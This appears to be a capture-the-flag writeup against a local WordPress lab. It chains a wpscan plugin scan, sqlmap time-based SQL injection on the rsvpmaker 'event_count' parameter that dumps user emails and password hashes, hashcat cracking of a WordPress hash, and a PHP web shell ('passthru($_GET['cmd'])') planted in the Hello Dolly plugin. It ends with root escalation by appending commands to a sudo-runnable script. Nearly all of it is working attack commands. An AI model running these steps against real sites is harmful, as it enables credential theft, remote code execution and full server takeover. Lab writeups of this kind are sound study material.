# Writeup

## wpscan

```
sudo docker run --net host -it --rm wpscanteam/wpscan --url http://localhost:8000/
```

```
[i] Plugin(s) Identified:

[+] rsvpmaker
 | Location: http://localhost:8000/wp-content/plugins/rsvpmaker/
 | Latest Version: 7.3.9 (up to date)
 | Last Updated: 2020-04-01T14:10:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.8.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://localhost:8000/wp-content/plugins/rsvpmaker/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://localhost:8000/wp-content/plugins/rsvpmaker/README.txt
```

Resources :
- https://wpscan.com/vulnerability/10371

## sqlmap

```
sqlmap -u "http://localhost:8000/?action=signed_up&event_count=1" --dbms mysql -p event_count --technique T
sqlmap -u "http://localhost:8000/?action=signed_up&event_count=1" --dbms mysql -p event_count --technique T --dbs
sqlmap -u "http://localhost:8000/?action=signed_up&event_count=1" --dbms mysql -p event_count --technique T -D wordpress --tables
sqlmap -u "http://localhost:8000/?action=signed_up&event_count=1" --dbms mysql -p event_count --technique T -D wordpress -T wp_users --columns
sqlmap -u "http://localhost:8000/?action=signed_up&event_count=1" --dbms mysql -p event_count --technique T -D wordpress -T wp_users -C user_email,user_login,user_pass --dump
```

Resources :
- http://sqlmap.org/

## hashcat

```
docker pull dizcza/docker-hashcat:intel-cpu
docker run -it dizcza/docker-hashcat:intel-cpu /bin/bash
echo '$P$BJkqcsKTDSa6O6YUu6dO9PJ5uX0Xrm0' > wp.hash
hashcat -a 0 -m 400 wp.hash hashcat/example.dict
hashcat -a 0 -m 400 wp.hash hashcat/example.dict --show
```

Resources :
- https://hashcat.net/wiki/doku.php?id=example_hashes

## RCE

Edit plugin Hello Dolly. Keep the comment with the plugin info.

```
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/
echo passthru($_GET['cmd']);
```

Visit : http://localhost:8000/wp-content/plugins/hello.php?cmd=cat+/flag.txt

## Privesc

```
sudo -l
ls -la /opt/update-wp
echo 'id;cat /root/flag.txt' >> /opt/update-wp
sudo /opt/update-wp
```

Visit : http://localhost:8000/wp-content/plugins/hello.php?cmd=sudo+-l;ls+-la+/opt/update-wp;echo+'id;cat+/root/flag.txt'+>>+/opt/update-wp;cat+/opt/update-wp;sudo+/opt/update-wp;
